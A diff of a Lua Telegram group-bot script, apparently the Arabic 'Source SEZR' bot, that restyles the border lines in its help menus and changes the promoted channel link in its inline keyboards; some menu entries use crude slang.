-𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
  🌕 تفعيل ← تعطيل 
  🌕 المجموعات ← المشتركين ← الاحصائيات
  🌕 رفع ← تنزيل منشئ اساسي
@@ -17881,9 +17886,9 @@ local Teext =[[
  🌕 مسح المنشئين ← المنشئين
  🌕 اسم ~ ايدي + بوت غادر 
  🌕 اذاعه 
-𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
 ❲المطور الاساسي+ المطور الثانوي❳
-𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
  🌕 تفعيل
  🌕 تعطيل
  🌕 مسح الاساسين
@@ -17935,7 +17940,7 @@ local Teext =[[
  🌕 المجموعات 
  🌕 تفعيل/تعطيل المغادره
  🌕 مسح الجروبات
-𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
 
 ]]
 keyboard = {} 
@@ -17957,7 +17962,7 @@ return false
 end
 local Teext =[[
     ❲اوامر الاعضاء ⇊❳     
-𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
  🌕   غنيلي ⇔ حساب العمر   
  🌕   صورتي ⇔ نسبه جمالي
  🌕   نقاطي
@@ -17978,7 +17983,7 @@ local Teext =[[
  🌕   بوسو ⇔ بوسها
  🌕   بتحب دي ⇔ بتحب ده
  🌕  بوت الحذف⇔رابط الحذف
-𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
 
 ]]
 keyboard = {} 
@@ -18001,7 +18006,7 @@ end
 local Teext =[[
 اوامر ❲التسليه❳  ⇊
 رفع ⇔ تنزيل + الامر
-𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
  🌕 رفع + تنزيل ← متوحد
  🌕 تاك للمتوحدين
 ▱▰▱▰▱▰▱▰▱▰▱▰▱▰
@@ -18050,7 +18055,7 @@ local Teext =[[
  🌕 رفع  ← علي زبي
  🌕 تنزيل ←من زبي 
  🌕 تاك للمتناكين
-𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
 
 ]]
 keyboard = {} 
@@ -18461,7 +18466,7 @@ keyboard.inline_keyboard = {
 {{text = 'لعبه كشف الكذب', callback_data="/help47"}},
 {{text = 'مريم', callback_data="/help36"},{text = 'عقاب', callback_data="/help42"}},
 {{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"}},
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -18569,14 +18574,14 @@ keyboard.inline_keyboard = {
 {{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
 {{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
 {{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"}},
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
 if Text == '/change-names' then
 local Teext =[[
     ❲اوامر الاعضاء ⇊❳  
-𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
  🌕   غنيلي ⇔ حساب العمر   
  🌕   صورتي ⇔ نسبه جمالي
  🌕   نقاطي
@@ -18597,7 +18602,7 @@ local Teext =[[
  🌕   بوسو ⇔ بوسها
  🌕   بتحب دي ⇔ بتحب ده
  🌕  بوت الحذف⇔رابط الحذف
-𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
  
 ]]
 keyboard = {} 
@@ -18606,7 +18611,7 @@ keyboard.inline_keyboard = {
 {text = '● لقائمه الرائسيه ●', callback_data="/change-id"},
 },
 {
-{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"},
+{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -18624,7 +18629,7 @@ keyboard.inline_keyboard = {
 {text = 'اوامر الاعضاء', callback_data="/change-names"},
 },
 {
-{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"},
+{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -18644,7 +18649,7 @@ keyboard.inline_keyboard = {
 {{text = 'غنيلي', callback_data="/help17"}},
 {{text = 'نسبه جمالي', callback_data="/help18"},{text = 'اليتيوب', callback_data="/help24"}},
 {{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"}},
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -18769,7 +18774,7 @@ keyboard.inline_keyboard = {
 {text = '◗الاوامر◖', callback_data="/help12"},
 },
 {
-{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"},
+{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -19122,7 +19127,7 @@ end
 if #list == 0 then
 t = " 🌕 لا يوجد ادمن"
 end
-send(msg.chat_id_,0,''..t..'\n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n 🌕 تم التعديل على الميديا\n 🌕 الشخص الي قام بالتعديل\n 🌕 ايدي الشخص ◂ '..result.sender_user_id_..'\n 🌕 معرف الشخص ↚{ '..users..' }') 
+send(msg.chat_id_,0,''..t..'\n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n 🌕 تم التعديل على الميديا\n 🌕 الشخص الي قام بالتعديل\n 🌕 ايدي الشخص ◂ '..result.sender_user_id_..'\n 🌕 معرف الشخص ↚{ '..users..' }') 
 end,nil)
 DeleteMessage(msg.chat_id_,{[0] = msg.message_id_}) 
 end
@@ -19193,7 +19198,7 @@ tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,
 if data.username_ ~= false then
 send(msg.chat_id_,0," 🌕 الـعـضو  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n 🌕 ["..DRAGONAbot.."] \n") 
 else
-send(msg.chat_id_,0," 🌕 الـعـضو  : {["..data.first_name_.."](t.me/surccesezr)}\n 🌕 ["..DRAGONAbot.."] \n") 
+send(msg.chat_id_,0," 🌕 الـعـضو  : {["..data.first_name_.."](T.ME/A_F_fwdka1)}\n 🌕 ["..DRAGONAbot.."] \n") 
 end
 end,nil)   
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
